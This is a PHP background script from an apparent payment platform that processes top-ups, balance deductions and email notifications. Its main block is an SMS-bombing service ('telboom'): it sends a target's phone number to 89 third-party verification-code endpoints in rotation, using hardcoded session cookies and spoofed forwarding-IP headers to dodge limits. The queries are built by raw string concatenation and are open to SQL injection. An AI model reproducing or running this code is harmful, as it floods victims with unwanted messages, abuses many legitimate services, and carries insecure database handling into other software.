<?php
	include("../function.php");
	
	$ordernum=$sql("SELECT count(*) FROM pay_order WHERE admin_id='".$sup_admin."' AND ispay='1' AND isdo='0' AND iscz='1' AND add_msg LIKE '%账户充值%' ");
	if($ordernum==0){
		//这是接口邮箱通知
		$ordernum=$sql("SELECT count(*) FROM pay_order_mail WHERE zt='0' ");
		if($ordernum==0){
			//扣余额系统;
			$ordernum=$sql("SELECT count(*) FROM pay_order WHERE ispay='1' AND ismoney='0' AND iscz='0' ");
			if($ordernum==0){
				//轰炸机执行订单
				if($sql("SELECT count(*) FROM telboom WHERE num>0 ")==0){
					//清理邮件库存
					$res = $sql("DELETE FROM pay_order_mail ");
					code(["code"=>"1","message"=>"清理日志成功！"]);
				} 
				 
				
				$telboom = $sql("SELECT * from telboom WHERE num>0 order by rand() limit 1");
				$i = $telboom['i'];
				$tel = $telboom['tel'];
				$time=time();
				$randip=rand("1","255").".".rand("1","255").".".rand("1","255").".".rand("1","255");
				if($i>='88')$i=0;
				
				if($i=='0')hs("https://uac.10010.com/portal/Service/SendMSG?callback=jQuery172076565523879526_1506486642542&req_time=1506486656403&mobile=".$tel."&_=".time()."000");	
				else if($i=='1')hs("https://login.10086.cn/needVerifyCode.htm?accountType=01&account=".$tel,"","CmLocation=591|594; WT_FPCN=id=2e346b9ea13d0994f5d1544974790417:lv=1544974794508:ss=1544974790417; jsessionid-echd-cpt-cmcc-jt=645C4B3C059398A042AF0A50BE8B7100; WT_FPC=id=25de82762cff3fb6b8c1544446476416:lv=1544974796762:ss=1544974795714; CmProvid=bj; sendflag=20181216234001639239");
				else if($i=='2')hs("https://gw-api-jdmdx.qingchunbank.com/jdmdxcredit/authentication/code?mobile=".$tel,"","");
				else if($i=='3')hs("https://www.fengwd.com/api/v2/user/loginRegister/captcha/text?version=1.0",array('mobile' => $tel),"_ga=GA1.2.130506573.".time()."; _gid=GA1.2.299411623.".time()."; _gat=1; Qs_lvt_185296=".time()."; Qs_pv_185296=3817374253826436000; Hm_lvt_cca0837a014621d8d933a0b1b2cb0be5=".time()."; Hm_lpvt_cca0837a014621d8d933a0b1b2cb0be5=".time()."; fjr_channel=www.baidu.com; fjr_channel_code=200042; fjr_channel_date=".time()."000; fjr_did=c5c9b7c5-433d-4156-85dd-c08796280039; fjr_vts=1; _fjrvts=1; fjr_fst=".time()."000; fjr_lst=".time()."000; fjr_vct=".time()."000; fjr_sqn=1; fjr_properties=%7B%22abtest%22%3A%22c%22%7D; fjr_internal_ip=".$randip."; mediav=%7B%22eid%22%3A%22414384%22%2C%22ep%22%3A%22%22%2C%22vid%22%3A%22jm%24%5B%3AZZsO%2B%3C%2B%3A3JY'1%60W%22%2C%22ctn%22%3A%22%22%7D",$header = array('CLIENT-IP: '.$randip,'X-FORWARDED-FOR: '.$randip));
				else if($i=='4')hs("https://www.smyfinancial.com/api/getDyncode",array('iNumber'=>$tel,'iPswLogin'=>'','idynCode'=>'','tokenId'=>'h5_8364f250-ab2b-400f-b08b-8acaa8e3770b','qd'=>'baidusem','cy'=>'bdsema2208','hd'=>'','stype'=>'','sc'=>'','timestamp'=>time(),'iPswPay'=>''),"acw_tc=7819730515449797091771728e872f3f3f019473a8a67c6f1717ee756d0037; token=h5_8364f250-ab2b-400f-b08b-8acaa8e3770b; connect.sid=s%3Aj8nDoh70v0Ef4Up-v_s4iuTdaM2YTJKb.MKQXu5kmLHTvB8p0dDPf27zzy1yc86k9e5R6I%2BExhAo; Hm_lvt_0c74208da5a38ff1ebc12a4cff21572d=1544979709; Hm_lpvt_0c74208da5a38ff1ebc12a4cff21572d=1544979709; __maxent_ckid=e07daddc-8bcb-41a3-b866-29759bf08d01; __maxent_jsid=5a1942d52dc7362c3c204d209d1a38d1; _fmdata=ZwaMZe4lgUaN9%2F6m1S81zTh50rlw1uu8EhwSosqVDKgoN66e8Dq%2FcWfSIJn7Ke55tYrAl%2FDcpW%2Ffkoy%2Bb4UrZFRNfTwDIyhSXDVzAaUqQtk%3D");
				else if($i=='5')hs("http://jql.xmkzjr.com/common/getcode.html",array("mobile"=>$tel,"check"=>"1"),"PHPSESSID=3d8e0amekku2t83jb32mbv0df4; _d_id=b1a1446ce6f35084bd095818343fbf");
				else if($i=='6')hs("https://h5.jielema.com/iotglb-openapi/api/lend",array("serCode"=>"10001","erminalCode"=>'{"appname":"h5","appversion":"2.2","type":"1","umengchannel":"web_ssy_message_reg2","kw":""}',"dataMsg"=>'{"mobile":"'.$tel.'","encrypt":"WxgKWHIrh4k4Pou6Cb4q/nGMB/5oT6et3yRbg9L%2B6EzKXFTgoNXhgP05%2B10hMLutQ0JDyaoLAojq8%2B%2BJXxUiijfluOfrLGWUp0f%2BsA7mzCpxKzSORKpOnoue%2BghR2uHQbpg/KBr8/tnC9JH5rR5EpMTlWcJGasYhaEe1c0%2B7lk8=","type":"1"}'),"JSESSIONID=D7A4FD805BD919E5A1F84BD9B720DDA9; Path=/iotglb-openapi/; HttpOnly");
				else if($i=='7')hs("http://www.klqian.com/include/getmbcode.html",array('mobile'=>$tel,'name'=>'王富贵','sheng'=>'','shi'=>'','birthday'=>'19900101','nocity'=>'1'),"acw_tc=76b20f7015452187598635430e4938784cd3d9c0358e3bd53b288892a0998d; ASPSESSIONIDCSCCRDRS=HFBCDIKABAIINNHBKHEBJDIJ; UM_distinctid=167c6371cc353b-0ba340a727541b-22722347-3616c-167c6371cc46fd; CNZZDATA1271442956=21531284-1545215690-%7C1545215690; Hm_lvt_65a54b73681f71fff1b970d1c414c60a=1545218760; Hm_lpvt_65a54b73681f71fff1b970d1c414c60a=1545218760; Hm_lvt_f5df380d5163c1cc4823c8d33ec5fa49=1545218760; Hm_lpvt_f5df380d5163c1cc4823c8d33ec5fa49=1545218760");
				else if($i=='8')hs("https://pub-api.pinganzhiyuan.com/api/smsCaptcha",array("phone"=>$tel));
				else if($i=='9')hs("https://sales.yingyinglicai.com:8443/sales/send/sms.do",array('mobile'=>$tel,'smsType'=>'-1'),"");
				else if($i=='10')hs("https://wcapi.fin-market.com.cn/turku/app/sendSmsCode/register",array('type'=>'0','platformId'=>'54','cellphone'=>$tel),"");
				else if($i=='11')hs("http://api.ppqb.top/api/customer/sendCaptcha?mobile=".$tel."&type=1","{}","","json");
				else if($i=='12')hs("https://hallelujah.ucredit.com/hallelujah/netMarketing/sendVerifyCode",array('cellphone'=>$tel,'sessionId'=>'67b9a059-a288-f8ce-2dfc-88968c4f80ff','picCode'=>'','picCodeRequired'=>'false'),"");
				else if($i=='13')hs("http://res.txingdai.com/account/code?phone=".$tel."&boundleId=com.tengxin.youqianji");
				else if($i=='14')hs("https://moneymarket.ssjlicai.com/userws/ws/register/v1/phone/sendValidateCode",array('params'=>'{"head":{"clientId":"12","appUDID":"","appVersion":"","channelId":"","innerMedia":"","outerMedia":"","subClientId":"h5","origin":""},"body":{"phone":"'.$tel.'"}}'),"");
				else if($i=='15')hs("http://smh5.nucdx.com:19092/api/credit-user/reg-get-code",array('phone'=>$tel,'appVersion'=>'2.1.1','channelCode'=>'wan1','type'=>'4','appName'=>'DSX'),"");
				else if($i=='16')hs("http://app.sdelife.com/front/register/sendCode?mobile=".$tel."&scene=register","","");
				else if($i=='17')hs("https://www.lanjiangsijie.com/home/send_sms",array('mobile'=>$tel,'usernme'=>'be0de49b','smscode'=>'','verify'=>'','password'=>''),"PHPSESSID=7ru9veb6fg4blrd36qedmm0s30");
				else if($i=='18')hs("https://mdzj139.com/webview/check_code",array('mobile'=>$tel,'type'=>'1790345','num'=>'6666'),"");
				else if($i=='19')hs("https://guannihua.com/wap/verify_code?pname=201801050001&ptime=1542334764591&vkey=59b108bc1e4c78a121d3b67cfd54c0cc&version=2.3&scene=30&flag=Yfu5C0SzgP1dwv6J&query_str=%2F%3Fchannel%3Ddefault&cid=16fc8506-ab23-eff3-c4db702e&phone=".$tel."&verify_code=&verify_type=100&login_pwd=",array('pname'=>'201801050001','ptime'=>'1542334764591','vkey'=>'59b108bc1e4c78a121d3b67cfd54c0cc','version'=>'2.3','scene'=>'30','flag'=>'Yfu5C0SzgP1dwv6J','query_str'=>'/?channel=default','cid'=>'16fc8506-ab23-eff3-c4db702e','phone'=>$tel,'verify_code'=>'','verify_type'=>'100','login_pwd'=>''),"");
				else if($i=='20')hs("https://www.smyfinancial.com/api/getDyncode",array('iNumber'=>$tel,'tokenId'=>'h5_b9553ae8-d58b-4cc5-b79f-5302f0302353','timestamp'=>$time),"");
				else if($i=='21')hs('http://www.gzhaituikeji.cn/v1/common/message?mobileNum='.$tel.'&appType=edqb');
				else if($i=='22')hs('https://bzq.duoweijr.cn/h5spread/ajax/getSmsCode?phoneNumber='.$tel);
				else if($i=='23')hs("https://saas.sxfq.com/watercloud_saas-api-web/v3/app/borrower/a16/sendMessageVerificationCode.do",array('phone'=>$tel),"");
				else if($i=='24')hs("https://api.jiebangbang.cn/manager/mgt/msgCode?phoneNumber=".$tel."&channelCode=Bo2M1m&signTemplateId=jbb",'',"");
				else if($i=='25')hs("https://pass.hujiang.com/v2/Handler/UCenter?action=SendMsg&mobile=%2B86-".$tel."&imgcode=&token=ca82c68d96f38837f57bb81e38f4b178&sendtype=register&msgtype=2&captchaVersion=2&user_domain=hj&business_domain=&hpuid=nV3q3e476hyCyNtEvm650&callback=reqwest_1545681506517705463",'',"");
				else if($i=='26')hs("http://b2c.csair.com/portal/smsMessage/EUserVerifyCode",array('mobile'=>$tel),"");
				else if($i=='27')hs("http://ucenter.inyuapp.com/v1/login/mobile/code",array('mobile'=>$tel,'country_code'=>'86'),"");
				else if($i=='28')hs("floor.huluxia.com/register/voiceverify/ANDROID/2.2?platform=2&gkey=500000&app_version=3.5.1.89.2&versioncode=249&market_id=tool_tencent&_key=&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5Da574288b-1ff0-48cf-a371-645e3ccae57f",array('email'=>$tel,'openid'=>'','access_tocken'=>'','send_type'=>'1'),"");
				else if($i=='29')hs("https://id.ifeng.com/api/simplesendmsg",array('mobile'=>$tel,'comefrom'=>'7','auth'=>'','msgtype'=>'0'),"");
				else if($i=='30')hs("http://bizapi.pezy.cn/qknode/sms/reqSmsCode",array('phone'=>$tel,'publishid'=>'1003','deviceId'=>'2808ec7ef7fbeed6','df'=>'android','vt'=>'5','screen'=>'1080x1920','deviceid'=>'2808ec7ef7fbeed6','proid'=>'qknode','os'=>'android','av'=>'NMF26X','appVersion'=>'1.4.0','imei'=>'','ov'=>'7.1.1','osVersion'=>'7.1.1','osLevel'=>'25','token'=>''),"");
				else if($i=='31')hs("http://jiuji.lyqchain.cn/api/system/sendmsgcode?format=json",array('tel'=>$tel),"");
				else if($i=='32')hs("http://static.huaqianwy.com/mem/sms/verification/send",array('mobilePhone'=>$tel,'smsType'=>'211'),"");
				else if($i=='33')hs("https://ql.xhq520.com/api/app/sendsms/".$tel."?source=wak01",'',"");
				else if($i=='34')hs("https://www.huaxiaojie.net/hhxj/reg/getSmsCode?r=1545846761898",array('phone'=>$tel,'type'=>'reg'),"");
				else if($i=='35')hs("http://res.txingdai.com/account/code?phone=".$tel."&boundleId=com.tengxin.youqianji");
				else if($i=='36')hs("https://account.xiaomi.com/pass/sendServiceLoginTicket?_dc=1546357754203",array('sid'=>'passport','user'=>$tel),"uLocale=zh_CN; pass_ua=web; deviceId=wb_f310d8f9-ef20-4613-b90c-d47b5e4f259f; pass_trace=kTu85Pb0DI5jA8rC+d4jfhkYdzMbscL9KfvvNnToHa1tgMRe2/9BZG4FS/DLUWFP32i1f35WRX53UcunyBv1TpIYefurN6v7u2jH3lnUWDPGBwQ04KM4nymrgFlR79bp; JSESSIONID=aaaHNmAmSiqz-6tvtg2Fw");
				else if($i=='37')hs("https://jie.gomemyf.com/jie-api/facade/h5post.do",array('jsonData'=>'{"service":"001009","mobile":"'.$tel.'","serKey":"5f28f2b858a6abf5e20800115546385f","clientType":"H5"}'),"");
				else if($i=='38')hs("https://www.51qub.com/member/sendmobilesms",array("mobile"=>$tel),"");
				else if($i=='39')hs("http://shxd.jienihua100.com/Api/share/getcode.html",array('mobile'=>$tel),"");
				else if($i=='40')hs("https://yocard.51xianjinwallet.com/youxin/user/getSms/bing2?userPhone=".$tel,array(''=>''),"",'',array('CLIENT-IP:'.$randip,'X-FORWARDED-FOR:'.$randip));
				else if($i=='41')hs("https://saas.sxfq.com/watercloud_saas-api-web/v3/app/borrower/a16/sendMessageVerificationCode.do",array('phone'=>$tel),"");
				else if($i=='42')hs("http://api.gymstar-edu.cn/sms/getRegisterSmsCode",array('userPhone'=>$tel,'typeFrom'=>'web'),"");
				else if($i=='43')hs("https://wx.9fchaoneng.cn/sys/sms/sendMobileCode?mobile=".$tel,'',"");
				else if($i=='44')hs("http://www.langhuadai.net/getmessage.html",array('UserID'=>$tel),"");
				else if($i=='45')hs("http://jswk.mayiduojin.com/api/site/sendsms",array('type'=>'registered','mobile_phone'=>$tel),"");
				else if($i=='46')hs("http://www.80houkeji.com/Register/SendValidCode_zzhs","{phoneNo:'".$tel."'}","",'json');
				else if($i=='47')hs("https://h5.91jsgo.com/user/sendOther",array('phone'=>$tel,'platform'=>'4','sign'=>md5(md5($tel.$time."000")),'timestamp'=>$time."000",'type'=>'0'),"");
				else if($i=='48')hs("http://api.mobile.auth.ycygmall.com/register/sms/code/send",array('telephone'=>$tel,'token'=>''),"");
				else if($i=='49')hs("http://api.mobile.auth.huadle.com/register/sms/code/send",array('telephone'=>$tel,'token'=>''),"");
				else if($i=='50')hs("http://app.shuziheika.com/api/user/getPhoneCode?phone=".$tel,'',"");
				else if($i=='51')hs("http://120.76.57.178:805/?method=zjp03.user.mobile.vcode.new.get",array('access_time'=>$time."000",'params'=>'{"mobile":"'.$tel.'","value":""}'),"");
				else if($i=='52')hs("http://47.107.243.83:805/?method=zjp02.user.mobile.vcode.get",array('access_time'=>$time."000",'params'=>'{"mobile":"'.$tel.'","value":""}'),"");
				else if($i=='53')hs("http://119.23.188.60:805/?method=zjp03.user.mobile.vcode.new.get",array('access_time'=>$time."000",'params'=>'{"mobile":"'.$tel.'","value":""}'),"");
				else if($i=='54')hs("http://hhcf.luobokoudai.com/tools/common_ajax.ashx?action=send_msg",array('domain'=>'http://hhcf.credit.huluobokeji.com','source'=>'NjU=','id'=>'NQ==','phone'=>$tel),"");
				else if($i=='55')hs("http://www.51qub.com/member/sendmobilesms",array('mobile'=>$tel));
				else if($i=='56')hs("http://ucenter.inyuapp.com/v1/login/mobile/code",array('mobile'=>$tel,'country_code'=>'86'));
				else if($i=='57')hs("http://open.ishansong.com/openapi/partner/generateRegisterCaptcha",array('mobile'=>$tel,'type'=>'110'));
				else if($i=='58')hs("http://id.ifeng.com/api/simplesendmsg",array('mobile'=>$tel,'comefrom'=>'7','auth'=>'','msgtype'=>'0'));
				else if($i=='59')hs("http://ucenter.inyuapp.com/v1/login/mobile/code?__plat=android&__version=1.3.3",array('mobile'=>$tel,'country_code'=>'0086'),"");
				else if($i=='60')hs("https://api.zrly6n.cn/User/applyCode?phone=".$tel."&owner=xiaojinzhu&channelCode=yutu1");
				else if($i=='61')hs("http://47.102.11.212/User/applyCode?phone=".$tel."&owner=sijidou&channelCode=xingb");
				else if($i=='62')hs("https://www.maimaiti.cn/mmt-wallet-user/wallet/sms/sendMobileCodeLimitCount.do",['type'=>'0','mobile'=>$tel]);
				else if($i=='63')hs("http://api.bnh.bbymi.com/sms/getRegisterSmsCodeNew",array('userPhone'=>$tel,'typeFrom'=>'web'));
				else if($i=='64')hs("https://ewangmi.com/api/user/channel/smscode",'{"accountName":"'.$tel.'","appName":"kld"}',"",'json');
				else if($i=='65')hs("http://www.51suishidai.com/sxxCd.do",['phone'=>$tel]);
				else if($i=='66')hs('https://api.creditfamily.cn/api/user/h5SendSmsV2.htm?phone='.$tel.'&type=register_verify');
				else if($i=='67')hs("http://39.98.206.77/common/getcode.html",['mobile'=>$tel,'check'=>'1','channel'=>'秒贷贷超市']);
				else if($i=='68')hs("https://h5.houputech.com/LoanMarketNWH/PromotionSendSmsUnVerify",['m'=>$tel,'source'=>'nwh','c'=>'8e44d03b2c3b43b2a11ad188048ee38f']);
				else if($i=='69')hs("https://user.api.91dkgj.com/userCenter/account/getSmsCodeH5N?channel=h5",'{"phoneNum":"'.$tel.'","codeType":9,"channel":"h5","vifiType":1,"h5source":"M18_duanxin_008","registerPackage":"有钱管家"}',"",'json');
				else if($i=='70')hs("http://www.kuaixianghua.com/client/Page/send_sms",['data[mobile]'=>$tel,'data[type]'=>'CODELOGIN']);
				else if($i=='71')hs("https://www.youxinsign.com:13086/youka/register-login/getSmsCode?phone=".$tel);
				else if($i=='72')hs("http://newunion.huazhu.com/Wechat/getMobileAuthCode",['phoneNumber'=>$tel,'captchaType'=>'WXLogin','sessionId'=>'5a332cd2-9c44-42ff-89de-28a85d6bd812']);
				else if($i=='73')hs("http://wappass.baidu.com/wp/api/login/sms",['staticpage'=>'https%3A%2F%2Ficash.baidu.com%2Fstatic%2Fcloan%2Fstatic%2Flogin%2Fv3Jump.html','charset'=>'UTF-8','tpl'=>'fbuym','apiver'=>'v3','tt'=>'1513060482109','username'=>$tel,'countrycode'=>'','ctype'=>'','dv'=>'MDExAAoAXAALA9IAJAAAAF00AAwCABqCurq6uPkbSwpZCloFWms0awZpC2IOawVwHQcCAASRkZGR',]);
				else if($i=='74')hs("http://b2c.csair.com/portal/smsMessage/EUserVerifyCode",array('mobile'=>$tel),"");
				else if($i=='75')hs("http://e.dangdang.com/media/api2.go?action=sendSmsVcode&phoneNum=".$tel."&custId=0&verifyType=5",['returnType'=>'json','deviceType'=>'Android','channelId'=>'30070','clientVersionNo'=>'6.5.0','serverVersionNo'=>'1.2.1','permanentId'=>'20180420103206567224098666658288214','deviceSerialNo'=>'cafd43acf1f4dedae0f144d7cbfe1697','macAddr'=>'d8%3Ac7%3A71%3Ab2%3Ac3%3A45','resolution'=>'720*1208','clientO'=>'',]);
				else if($i=='76')hs("http://id.ifeng.com/api/simplesendmsg",array('mobile'=>$tel,'comefrom'=>'7','auth'=>'','msgtype'=>'0'),"");
				else if($i=='77')hs("http://user.qunar.com/webApi/logincode.jsp",array('mobile'=>$tel,'vcode'=>'','origin'=>'wechat$$$qunar','action'=>'register','type'=>'implicit'));
				else if($i=='78')hs("http://jxcps.sinopec.com/sms/createSMS",array('phone'=>$tel,'tempCode'=>'wechat_zc'));
				else if($i=='79')hs("http://sso.kuaidi100.com/sso/smssend.do",array('name'=>$tel));
				else if($i=='80')hs("http://m.e-baopai.com/api/common/msend_sms.html?&type=2&phone=".$tel);
				else if($i=='81')hs('http://211.156.201.12:8088/youzheng//ems/security',['phone'=>$tel]);
				else if($i=='82')hs('http://www.yunzshop.com/plugin.php?id=comiis_sms&action=register&comiis_tel='.$tel.'&inajax=1');
				else if($i=='83')hs("http://mobile.vvfind.net/AppV2Service?method=registsmscode&username=".$tel);
				else if($i=='84')hs("https://passport.migu.cn/portal/user/register/msisdn/captcha",['isAsync'=>'true','msisdn'=>$tel,'graphCaptcha'=>'','sourceid'=>'205050','imgcodeType'=>'3']);
				else if($i=='85')hs("http://a.lc1001.com/sms/m",array('act'=>'reg','pNo'=>$tel),"");
				else if($i=='86')hs("https://hdgateway.zto.com/auth_account_sendLoginOrRegisterSmsVerifyCode",array('mobile'=>$tel),"");
				else if($i=='87')hs("https://apineo.llsapp.com/api/v1/campaigns/invitations/bind_code",array('mobile'=>$tel),"");
				else if($i=='88')hs('http://www.41lan.com:80/master/verify',['phoneNumber'=>$tel]);
				
				$i= $i+1;
				$res = $sql("UPDATE  `telboom` SET num=num-'1',i='{$i}' WHERE id='".$telboom['id']."' ");
				code(["code"=>"1","message"=>"执行成功！"]);
				
			}
			$o = $sql("SELECT * FROM pay_order WHERE ispay='1' AND ismoney='0' AND iscz='0' ORDER BY id ASC LIMIT 0,1");
			$admin = $sql("SELECT * FROM admin WHERE id='".$o['admin_id']."' ");
			$needmoney=$o['money']*$pay_need;
			$needmoney=$admin['money']-$needmoney;
			$res = $sql("UPDATE  `pay_order` SET ismoney='1' WHERE  id='".$o['id']."'");
			$res = $sql("UPDATE  `admin` SET money='{$needmoney}' WHERE  id='".$admin['id']."'");
			code(["code"=>"1","message"=>"余额扣款成功！"]);
			
		}
		
		$o = $sql("SELECT * FROM pay_order_mail WHERE zt='0' ORDER BY id ASC LIMIT 0,1");
		
		$order = $sql("SELECT * FROM pay_order WHERE admin_id='".$o['admin_id']."' AND orderid='".$o['orderid']."' ");
		$config = $sql("SELECT * FROM pay_config WHERE admin_id='".$o['admin_id']."' ");
		
		$who = "admin";
		$title = "支付系统收款通知";
		if($order['goodsid']==0)$text = "<b>收款到账".$order['money']."元！<br>订单号：".$order['orderid']."<br>用户付款方式:".$order['paytype']."<br>收款接口:".$order['paysys']."<br>付款时间:".$order['pay_time']."<br>付款IP:".$order['add_ip']."</b>";
		else $text = "<b>商品订单交易".$order['money']."元！<br>订单号：".$order['orderid']."<br>用户付款方式:".$order['paytype']."<br>收款接口:".$order['paysys']."<br>付款时间:".$order['pay_time']."<br>付款IP:".$order['add_ip']."<br>商品ID:".$order['goodsid']."</b>";
		
		$res = $sql("SELECT * FROM smtp_config WHERE admin_id='".$o['admin_id']."' ");
		if($who=='admin')$who = $res['adminmail'];
		
		$a = smtp($res['smtp'],$res['port'],$res['isssl'],"T1支付平台",$res['user'],$res['pass'],$title,$text,$who);
		$res = $sql("INSERT INTO `smtp_log` (`admin_id`,`add_time`,`add_ip`,`add_title`,`add_text`,`add_who`) VALUES ('".$admin['id']."','{$date}','系统执行','{$title}','{$text}','{$who}')");
		$res = $sql("UPDATE  `pay_order_mail` SET zt='1' WHERE id='".$o['id']."' ");
		code(["code"=>"1","message"=>"邮件通知已发送！"]);
		
	}
	$order = $sql("SELECT * FROM pay_order WHERE admin_id='".$sup_admin."' AND ispay='1' AND isdo='0' AND iscz='1' AND add_msg LIKE '%账户充值%' ORDER BY id ASC LIMIT 0,1 ");
	$user = sj($order['add_msg'],'账户充值\(','\)');
	$users = $sql("SELECT * FROM admin WHERE user='{$user}' ");
	if(!$users){
		$res = $sql("UPDATE  `pay_order` SET isdo='1',do_msg='无号码订单' WHERE id='".$order['id']."' ");
		code(["code"=>"1","message"=>"无号码订单"]);
	}
	$res = $sql("UPDATE  `admin` SET money=money+'".$order['money']."' WHERE user='".$user."'");
	$res = $sql("INSERT INTO `log_admin_money` (`admin_id`,`money`,`addtime`,`message`) VALUES ('".$users['id']."','".$order['money']."','{$date}','在线充值')");
	$res = $sql("UPDATE  `pay_order` SET isdo='1' WHERE id='".$order['id']."'");
	code(["code"=>"1","message"=>"成功！"]);
	
	
	
	